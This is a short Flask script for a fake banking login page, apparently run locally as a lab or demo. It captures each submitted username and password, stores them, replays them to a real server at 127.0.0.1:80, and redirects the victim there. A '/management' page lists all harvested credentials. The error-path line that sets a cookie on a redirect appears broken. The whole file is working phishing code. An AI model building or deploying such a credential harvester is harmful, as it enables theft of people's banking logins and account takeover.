from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)
login_data = []

@app.route("/", methods=["GET", "POST"])
@app.route('/fake_banking', methods=["GET", "POST"])
def home():
    global login_data
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        login_data.append((username,password))
        resp = requests.post("http://127.0.0.1:80/", data={"username":username, "password":password})

        if resp.status_code == 200:
            return redirect("http://127.0.0.1:80/", code = 307)
        else:
            return redirect("http://127.0.0.1:5000/").set_cookie("message", "An error has occurred while trying to log in. Please try again.")
    return render_template("banking.html")
@app.route("/management")
def management():
    global login_data
    return render_template("management.html", login_data=login_data)

if __name__ == "__main__":
    app.run()